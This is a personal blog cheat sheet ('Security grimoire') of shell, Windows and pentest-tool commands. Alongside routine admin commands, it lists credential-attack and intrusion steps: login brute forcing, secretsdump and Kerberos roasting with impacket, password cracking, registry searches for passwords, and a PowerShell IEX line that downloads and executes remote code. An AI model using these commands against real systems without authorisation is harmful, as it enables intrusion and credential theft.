---
title: "Security grimoire"
layout: single
author_profile: true
classes: wide
tags:
  - cheatsheet
  - windows
  - linux
---
Welcome to [@muemmelmoehre](https://github.com/muemmelmoehre)'s online grimoire / cheat-sheet for useful commands. Enjoy!


*(Awesome ASCII art like the one below can be found [here](https://asciiart.website/index.php).)*




```
                        .-~~~~~~~~~-._       _.-~~~~~~~~~-.
                    __.'              ~.   .~              `.__
                  .'//                  \./                  \\`.
                .'//                     |                     \\`.
              .'// .-~"""""""~~~~-._     |     _,-~~~~"""""""~-. \\`.     
            .'//.-"                 `-.  |  .-'                 "-.\\`.
          .'//______.============-..   \ | /   ..-============.______\\`.
        .'______________________________\|/______________________________`.

```



```
BASH / SH
---------
# add ! at the end of each line in wordlist
for i in $(cat wordlist.txt); do echo $i; echo ${i}\!;done > tmp
mv tmp wordlist.txt

# for loop from x to z, incrementing in steps of y
for i in $(seq x y z); do command_here; done;

# base64 encode string
echo -n string_here | base64

# base64 decode string
echo -n b64_string_here | base64 -d

# sort text file in alphabetical order + remove duplicates
sort -u file_name_here

# list every file with SUID bit set
find / -user root -perm -4000 -exec ls -ldb {} \;

# list files recursively
find . -type f

# continously show last lines from text file
tail -f /path/to/file


CEWL
----
# create a wordlist from URL
cewl -w /path/to/outfile.txt -v URL_here


CMD
---
# enumerate hidden files
dir -ah
dir /ah
attrib


CRACKMAPEXEC
------------
# check for password policy on Windows domain
crackmapexec protocol_here IP_here --pass-pol -u '' -p ''

# brute force login
crackmapexec protocol_here IP_here -u userlist.txt -p passwordlist.txt

# crawl smb shares
crackmapexec smb IP_here -u user -p password -M spider_plus


DIG
---
# print public IP
dig +short myip.opendns.com @resolver1.opendns.com


DOS2UNIX / UNIX2DOS
------------------
# convert text files from DOS to Unix (CR/LF -> LF)
dos2unix filename
dos2unix filename -n new_file

# convert text files from Unix to DOS (LF -> CR/LF)
unix2dos filename
unix2dos filename -n new_file


DRUPAL
------
# droopescan
droopescan scan drupal -u IP_here


ENV
---
# show all environment variables
env

# set environment variable 
export VARIABLE_HERE=value_here

# show value
echo $VARIABLE_HERE


EVIL-WINRM
----------
# connect to IP_here as user
evil-winrm -i IP_here -u user -p password 


FFUF
----
# enumerate files
ffuf -w /path/to/wordlist.txt -u http://IP_here/FUZZ.html
ffuf -w /path/to/wordlist.txt -u http://IP_here/FUZZ.php 
ffuf -w /path/to/wordlist.txt -u http://IP_here/FUZZ.txt

# filter out responses with a certain number of words
ffuf -w /path/to/wordlist.txt -u http://IP_here/FUZZ -fw number_here

# filter out responses with a certain size
ffuf -w /path/to/wordlist.txt -u http://IP_here/FUZZ -fs size_here

# filter out responses with a certain status code
ffuf -w /path/to/wordlist.txt -u http://IP_here/FUZZ -fc code_here

# read raw HTTP request from file
ffuf -w /path/to/wordlist.txt -request file_here


FTP
---
# connect
ftp IP_here

# file upload
put /path/to/local/file [/path/remote]

# file download
get /path/to/remote/file


GOBUSTER
--------
# enumerate web folders
gobuster dir -u http://IP_here -w /path/to/wordlist.txt -o root-dir

# skip SSL certificate verfication
gobuster dir -u http://IP_here -w /path/to/wordlist.txt -k


HASHCAT
-------
# permute words in wordlist
hashcat --force --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule


IMPACKET
--------
# get TGT for users with UF_DONT_REQUIRE_PREAUTH
/path/to/impacket/examples/GetNPUsers.py domain/ -usersfile /path/to/users.txt -no-pass -outputfile /path/to/tgt.txt

# dump secrets as user
/path/to/impacket-secretsdump -dc-ip IP_here user:password@IP_here

# gather service principal names
/path/to/impacket/examples/GetUserSPNs.py -dc-ip IP_here domain/user


JOHN
----
# crack password hash - dictionary attack
john -w=/path/to/wordlist /path/to/hash


LDAP
----
# nmap script
nmap --script ldap-search IP_here 

ldapsearch -LLL -x -H ldap://IP_here -b '' -s base'(objectclass=*)'

ldapsearch -x -h IP_here -s sub -b 'dc=domain_here,dc=dc2_here'

# get domain name
ldapsearch -x -h IP_here -s base namingcontexts


MSSQL
-----
# connect to a db server as user
mssql -s IP_db_server -o port -u username -p password


MYSQL / MARIADB
---------------
# start service
systemctl start mysql.service

# restart service
systemctl restart mysql.service

# stop service
systemctl stop mysql.service

# launch mysql as default user on kali
mysql -u root -p

# create new database
create database 'db_name';

# list existing databases
show databases;

# enter database
use db_name;

# create new table + define columns
create table 'table_name' (column_name1 VARCHAR(20), username VARCHAR(8), email VARCHAR(35), password VARCHAR(25), [...]);

# list existing tables of current database
show tables;

# list all data from table
select * from 'table_name';

# create new user@localhost
create user 'username'@'localhost' identified by 'password';

# create new user@IP_here
create user 'username'@'IP_here' identified by 'password';

# create new user@IP_wildcard
create user 'username'@'%' identified by 'password';

# grant privileges to user@IP_here for every database
grant all privileges on *.* to 'username'@'IP_here' identified by 'password';

# grant privileges to user@IP_here for every table in db_name database
grant all privileges on 'db_name'.* to 'username'@'IP_here' identified by 'password';

# grant privileges to user@IP_here for table table_name in db_name database
grant all privileges on 'db_name'.'table_name' to 'username'@'IP_here' identified by 'password';

# show privileges for user
show grants for 'username'@'IP_here';

# apply changes to privileges
flush privileges;

# delete user
drop user 'username'@'IP_here';


NET
---
# add new user
net user user_here password_here /add

# add new user to domain
net user user_here password_here /add /domain

# add user to group 
net group "group_name_here" /add user_here

# display user information
net user user_here /domain


PERL
----
# generate string of 20 A + concatenate with ABCD
$(perl -e 'print "\x41" x 20 . "ABCD"')


PHP
---
# interactive mode
php -a


PIP
---
# install pip package
python3 -m pip install package


POWERSHELL
----------
# grep
Select-String -Path C:\path\here\*.extension_here -Pattern "string_here"

# grep recursively
Get-ChildItem C:\path\to\directory -Filter *.extension_here -Recurse | Select-String "string_here"

# download file from web server
IEX(New-Object Net.WebClient).downloadString('http://URL_here/file_here')

# search for a file
Get-Childitem –Path C:\ -Recurse –force -ErrorAction SilentlyContinue -Include *.extension_here -File

# display user privs
whoami /all


PYTHON
------
# user python path from env
#!/usr/bin/env python
#!/usr/bin/env python3

# HTTP server
python -m SimpleHTTPServer 80
python3 -m http.server 80


REG QUERY
---------
# enumerate registry information, search recursively for password in HKLM
reg query HKLM /f password /t REG_SZ /s

# enumerate registry information, search recursively for password in HKCU
reg query HKCU /f password /t REG_SZ /s


RPC
---
# connect anonymously
rpcclient -U "" IP_here

# connect as user
rpcclient -U username%password IP_here

# nmap script
nmap --script rpc-grind IP_here

# rpcclient - find domain name
querydominfo

# rpcclient - domain look-up
lookupdomain domaine_here

# rpcclient - enumerate domain users
enumdomusers

# rpcclient - display description fields
querydispinfo


RPCBIND
-------
# enumerate rpcbind
rpcinfo IP_here

# show export list for NFS server
showmount -e IP_here


SCP
---
# copy remote file to local machine
scp user@IP_here:/path/to/remote/file /path/to/local/file

# copy local file to remote machine
scp /path/to/local/file user@IP_here:/path/to/remote/file

# authenticate with ssh key + copy remote file to local machine
scp -i private_key_here user@IP_here:/path/to/remote/file /path/to/local/file

# authenticate with ssh key + copy local file to remote machine
scp -i private_key_here /path/to/local/file user@IP_here:/path/to/remote/file 


SFTP
----
# connect as user
sftp -oPort=port user@IP_here

# upload file
put /path/to/local/file [/path/remote]

# download file
get /path/to/remote/file


SIPVICIOUS
----------
# enumerate SIP servers
svmap IP_range_here

# enumerate valid extensions for SIP endpoints
svwar -m INVITE IP_here


SMB
---------
# enumerate shares with anonymous login
smbclient -L smb -I IP_here

# enumerate smb shares as user
smbclient -L smb -I IP_here -U user

# enumerate smb shares
nmap --script=smb-enum-shares IP_here

# enumerate smb shares
smbmap -H IP_here

# enumerate smb shares as user
smbmap -u user -p password -d domain -H IP_here

# enumerate smb shares
crackmapexec smb IP_here --shares

# enumerate smb shares as user
crackmapexec smb IP_here -u user -p password --shares

# connect to a directory on a share as username
smbclient \\\\IP_here\\some_share -D some_folder -U username%password

# smbclient - upload file
put /path/to/local/file [/path/remote]

# smbclient - download file
get /path/to/remote/file

# mount smb share
sudo mount -t cifs -o 'user=user_here,password=password_here' //IP_here/share_here /path/to/mountpoint


SQLITE3
--------
# display database content
sqlite3 database_here .dump


SQLMAP
------
# launch sqlmap from a GET / POST request file
python /path/to/sqlmap -r req.txt -p param_to_attack1,param2,param3

# set dbms
python /path/to/sqlmap -r req.txt -p param_to_attack1,param2,param3 --dbms=DBMS_here

# list available tampers
python /path/to/sqlmap --list-tampers


SSH
---
# connect as user with password
ssh user@IP

# connect as user with private key
ssh -i private_key user@IP

# port forwarding
ssh -L port_to_forward_to:IP_here:port_to_forward_from


TCPDUMP
-------
# list all interfaces
tcpdump -D

# monitor connections on interface
tcpdump -i interface_here

# monitor specific src and / or dst IP
tcpdump -i interface_here src IP_here and dst IP_here

# monitor specific dst IP and port
tcpdump -i interface_here dst IP_here and port port_here


VIM
---
# jump to line
:line_number_here


XXD
---
# plaintext hexdump
xxd -p filename_here
```
